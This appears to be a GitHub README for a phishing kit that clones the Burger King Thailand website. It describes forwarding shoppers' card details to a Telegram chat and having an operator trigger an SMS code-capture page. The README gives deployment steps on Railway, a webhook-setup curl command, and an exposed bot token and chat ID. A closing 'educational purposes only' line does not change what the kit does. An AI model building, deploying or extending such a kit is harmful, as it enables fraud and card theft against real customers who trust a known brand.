# 🍔 Burger King Thailand Clone

Perfect 1:1 clone of Burger King Thailand website with Telegram bot integration.

## 🚀 Features

- **Complete Burger King Website** - Exact replica of the original
- **Telegram Bot Integration** - Real-time SMS verification
- **Payment System** - Integrated card payment with SMS verification
- **Multi-language Support** - Thai and English
- **Responsive Design** - Works on all devices

## 🛠️ Tech Stack

- **Frontend**: React + Vite
- **Backend**: Node.js + Express
- **Telegram Bot**: Webhook integration
- **Deployment**: Railway

## 📦 Quick Start

### Local Development

```bash
# Install dependencies
npm install

# Start development server
npm run dev

# Start webhook server
node webhook-server.cjs
```

### Production Deployment

```bash
# Build frontend
npm run build:frontend

# Start production server
npm run start
```

## 🚀 Deploy on Railway

1. **Fork this repository**
2. **Go to [Railway.app](https://railway.app)**
3. **Connect your GitHub account**
4. **Deploy from GitHub repo**
5. **Set environment variables:**
   - `BOT_TOKEN`: `8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg`
   - `CHAT_ID`: `-1003171719602`
6. **Set webhook URL in Telegram**

## 🔧 Environment Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `BOT_TOKEN` | Telegram bot token | `8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg` |
| `CHAT_ID` | Telegram chat ID | `-1003171719602` |
| `PORT` | Server port | `3001` |

## 📱 Telegram Bot Setup

1. **Add bot to your channel**
2. **Set webhook URL:**
   ```bash
   curl -X POST "https://api.telegram.org/bot8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg/setWebhook" \
     -H "Content-Type: application/json" \
     -d '{"url":"https://your-app-name.railway.app/webhook"}'
   ```

## 🧪 Testing

1. **Open your Railway URL**
2. **Add items to cart**
3. **Go to checkout**
4. **Enter card details**
5. **Click "Pay Now"**
6. **In Telegram, click "Запросить SMS"**
7. **Verify SMS page opens**

## 📁 Project Structure

```
├── src/                    # Frontend React code
│   ├── components/         # React components
│   ├── pages/             # Page components
│   ├── context/           # React context
│   ├── i18n/              # Translations
│   └── utils/             # Utilities
├── dist/                  # Built frontend
├── webhook-server.cjs     # Backend server
├── package.json           # Dependencies
├── railway.json          # Railway config
└── Procfile              # Start command
```

## 🔒 Security

- All card data is sent to Telegram for verification
- No card data is stored on the server
- SMS verification required for all payments

## 📞 Support

For issues or questions, please check the Railway logs or contact support.

## 📄 License

This project is for educational purposes only.
